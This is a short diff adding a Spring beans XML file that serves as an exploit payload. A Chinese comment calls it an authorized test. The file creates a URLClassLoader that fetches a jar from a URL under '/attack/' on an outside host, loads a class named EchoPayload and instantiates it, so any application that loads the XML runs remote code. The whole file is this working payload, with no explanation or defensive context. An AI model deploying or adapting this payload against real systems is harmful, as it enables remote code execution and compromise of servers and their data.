@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <!-- 授权测试：远程加载回显类并实例化 -->
+    <bean id="cl" class="java.net.URLClassLoader">
+        <constructor-arg>
+            <list>
+                <value>http://host.docker.internal:18180/attack/echo.jar</value>
+            </list>
+        </constructor-arg>
+        <constructor-arg>
+            <bean class="org.springframework.util.ClassUtils" factory-method="getDefaultClassLoader"/>
+        </constructor-arg>
+    </bean>
+    <bean id="echoClz" class="java.lang.Class" factory-bean="cl" factory-method="loadClass">
+        <constructor-arg value="EchoPayload"/>
+    </bean>
+    <bean class="java.lang.Object" factory-bean="echoClz" factory-method="newInstance"/>
+</beans>
